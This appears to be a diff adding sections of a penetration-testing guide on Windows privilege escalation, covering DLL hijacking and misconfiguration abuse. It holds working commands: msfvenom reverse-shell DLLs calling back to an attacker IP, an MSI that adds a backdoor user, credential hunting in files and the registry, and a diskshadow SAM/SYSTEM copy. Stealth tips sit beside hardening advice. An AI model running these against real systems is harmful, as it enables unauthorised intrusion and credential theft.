+                "**WinPEAS**",
+                ", ",
+                "**AccessChk**",
+                ", ",
+                "**SC.exe**"
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "OPSEC / Notes: Use filenames that look legitimate, time execution with ",
+                "**service restarts**",
+                ", ",
+                "**clean up**",
+                " after exploitation."
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "4.5 ",
+                "**DLL Hijacking**",
+                "\nWhat it is and Why it Matters: Placing ",
+                "**malicious DLLs**",
+                " where applications will load them instead of legitimate ones, inheriting the application's ",
+                "**privileges**",
+                "."
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "Quick Steps / Commands:"
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "**Find DLL Hijacking Opportunities**",
+                ":"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "cmd",
+              "text": "# Process Monitor for DLL search order\nprocmon.exe /AcceptEula /Quiet /BackingFile log.pml\n# Filters: Result is NAME NOT FOUND, Path ends with .dll\n\n# Manual checking with listdlls\nlistdlls.exe -d example.dll\n\n# Common hijack locations:\n# - Application directory (writable)\n# - Windows directories (if writable)  \n# - Current directory"
+            },
+            {
+              "type": "p",
+              "parts": [
+                "**Generate Malicious DLL**",
+                ":"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "bash",
+              "text": "# Meterpreter DLL\nmsfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.20 LPORT=443 -f dll > hijack.dll\n\n# Simple reverse shell DLL\nmsfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.20 LPORT=443 -f dll > hijack.dll\n\n# For specific architecture\nmsfvenom -p windows/meterpreter/reverse_https LHOST=10.10.14.20 LPORT=443 -f dll > hijack32.dll"
+            },
+            {
+              "type": "p",
+              "parts": [
+                "**DLL Proxying (Maintain Functionality)**",
+                ":"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "cpp",
+              "text": "// Forward exports while adding malicious code\n#pragma comment(linker, \"/export:RealFunction=hijack.RealFunction\")\n\n// DLLMain with malicious code\nBOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {\n    if (dwReason == DLL_PROCESS_ATTACH) {\n        // Malicious code here\n        system(\"cmd.exe /c whoami > C:\\\\output.txt\");\n    }\n    return TRUE;\n}"
+            },
+            {
+              "type": "p",
+              "parts": [
+                "**PowerShell Discovery**",
+                ":"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "powershell",
+              "text": "# Find missing DLLs\nGet-Process | ForEach-Object { \n    $_.Modules | Where-Object {$_.FileName -eq $null} | Select-Object ProcessName\n}\n\n# Check writable directories\nGet-ChildItem \"C:\\\" -Recurse -Directory | Get-Acl | Where-Object {$_.Access | Where-Object {$_.IdentityReference -eq \"BUILTIN\\Users\" -and $_.FileSystemRights -match \"Write\"}}\n\n# PowerSploit module\nImport-Module .\\PowerUp.ps1\nFind-ProcessDLLHijack"
+            },
+            {
+              "type": "p",
+              "parts": [
+                "What to Expect: Malicious DLL loads when a vulnerable application runs, inherits the application's ",
+                "**privileges**",
+                "."
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "Detection / Hardening:"
+              ]
+            },
+            {
+              "type": "ul",
+              "items": [
+                {
+                  "parts": [
+                    "**DLL search order hardening**"
+                  ]
+                },
+                {
+                  "parts": [
+                    "**Code signing verification**"
+                  ]
+                },
+                {
+                  "parts": [
+                    "Monitor ",
+                    "**DLL loads from unusual locations**"
+                  ]
+                },
+                {
+                  "parts": [
+                    "**EDR detection**",
+                    " of known ",
+                    "**hijack patterns**"
+                  ]
+                },
+                {
+                  "parts": [
+                    "**Protected processes (PPL)**"
+                  ]
+                }
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "Tools / References: ",
+                "**Process Monitor**",
+                ", ",
+                "**DLL Export Viewer**",
+                ", ",
+                "**PowerSploit**",
+                ", ",
+                "**Rattler**"
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "OPSEC / Notes: Test thoroughly to avoid crashes, use ",
+                "**DLL proxying**",
+                " for ",
+                "**stealth**",
+                ", target applications that run with ",
+                "**elevated privileges**",
+                "."
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "4.6 ",
+                "**Misconfigurations Exploitation**",
+                "\nWhat it is and Why it Matters: Leveraging ",
+                "**system misconfigurations**",
+                " for ",
+                "**privilege escalation**",
+                " without traditional exploits."
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "Quick Steps / Commands:"
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "**Service Permission Checks**",
+                ":"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "cmd",
+              "text": "# Check service permissions with accesschk\naccesschk.exe -uwcqv \"Authenticated Users\" * /accepteula\naccesschk.exe -uwcqv \"Everyone\" * /accepteula\n\n# Check specific service\nsc qc \"VulnerableService\"\naccesschk.exe -ucqv VulnerableService\n\n# PowerShell service checks\nGet-Service | ForEach-Object { \n    $perms = sc.exe sdshow $_.Name\n    if ($perms -like \"*WD*\") { Write-Host \"Weak permissions on: $($_.Name)\" }\n}"
+            },
+            {
+              "type": "p",
+              "parts": [
+                "**AlwaysInstallElevated**",
+                ":"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "cmd",
+              "text": "# Check if AlwaysInstallElevated is enabled\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n\n# Create malicious MSI\nmsfvenom -p windows/adduser USER=backdoor PASS=Password123! -f msi > setup.msi\n\n# Install MSI with system privileges\nmsiexec /quiet /qn /i setup.msi\n\n# Metasploit module\nuse exploit/windows/local/always_install_elevated\nset SESSION 1\nexploit"
+            },
+            {
+              "type": "p",
+              "parts": [
+                "**Unattended Install Files**",
+                ":"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "cmd",
+              "text": "# Find unattended installation files\ndir /s *unattend.xml\ndir /s *sysprep.inf\ndir /s *sysprep.xml\n\n# Check for credentials\ntype C:\\Windows\\Panther\\unattend.xml\nfindstr /S /I \"password\" *.xml *.ini *.txt\n\n# Common locations:\n# C:\\Windows\\Panther\\\n# C:\\Windows\\Panther\\Unattend\\\n# C:\\Windows\\System32\\sysprep\\"
+            },
+            {
+              "type": "p",
+              "parts": [
+                "**PowerShell Misconfiguration Checks**",
+                ":"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "powershell",
+              "text": "# PowerUp for comprehensive checks\nImport-Module .\\PowerUp.ps1\nInvoke-AllChecks\n\n# Check for password in files\nGet-ChildItem C:\\ -Include *.txt,*.xml,*.ini -Recurse -ErrorAction SilentlyContinue | Select-String \"password\"\n\n# Check registry for passwords\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" 2>$null\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword\n\n# Scheduled task permissions\nschtasks /query /fo LIST /v\nGet-ScheduledTask | Where-Object {$_.Principal.UserId -eq \"Users\"}"
+            },
+            {
+              "type": "p",
+              "parts": [
+                "**Writable Service Binaries**",
+                ":"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "powershell",
+              "text": "# Find services with writable binaries\nGet-WmiObject -Class Win32_Service | ForEach-Object {\n    $path = $_.PathName.Trim('\"')\n    if (Test-Path $path) {\n        $acl = Get-Acl $path\n        if ($acl.Access | Where-Object {$_.IdentityReference -eq \"BUILTIN\\Users\" -and $_.FileSystemRights -match \"Write\"}) {\n            Write-Host \"Writable service binary: $path\"\n        }\n    }\n}"
+            },
+            {
+              "type": "p",
+              "parts": [
+                "**Backup Operator to Domain Admin**",
+                ":"
+              ]
+            },
+            {
+              "type": "code",
+              "language": "cmd",
+              "text": "# If in Backup Operators group\n# Use diskshadow to create shadow copy\ndiskshadow.exe /s script.txt\n\n# Script.txt contents:\nset context persistent nowriters\nset metadata c:\\windows\\temp\\meta.cab\nset verbose on\nbegin backup\nadd volume c: alias mydrive\ncreate\nexpose %mydrive% z:\nend backup\n\n# Then copy SAM/SYSTEM from Z:\\"
+            },
+            {
+              "type": "p",
+              "parts": [
+                "What to Expect: Various ",
+                "**privilege escalation paths**",
+                " depending on found ",
+                "**misconfigurations**",
+                "."
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "Detection / Hardening:"
+              ]
+            },
+            {
+              "type": "ul",
+              "items": [
+                {
+                  "parts": [
+                    "Regular ",
+                    "**security configuration audits**"
+                  ]
+                },
+                {
+                  "parts": [
+                    "**Least privilege principle**",
+                    " for services"
+                  ]
+                },
+                {
+                  "parts": [
+                    "**Disable AlwaysInstallElevated**"
+                  ]
+                },
+                {
+                  "parts": [
+                    "**Clean up unattended installation files**"
+                  ]
+                },
+                {
+                  "parts": [
+                    "Monitor for ",
+                    "**configuration changes**"
+                  ]
+                }
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "Tools / References: ",
+                "**PowerUp**",
+                ", ",
+                "**WinPEAS**",
+                ", ",
+                "**AccessChk**",
+                ", ",
+                "**Seatbelt**",
+                ", ",
+                "**PrivescCheck**"
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "OPSEC / Notes: Use ",
+                "**built-in tools**",
+                " when possible, avoid making unnecessary changes, ",
+                "**document found misconfigurations**",
+                " for reporting."
               ]
             }
           ]
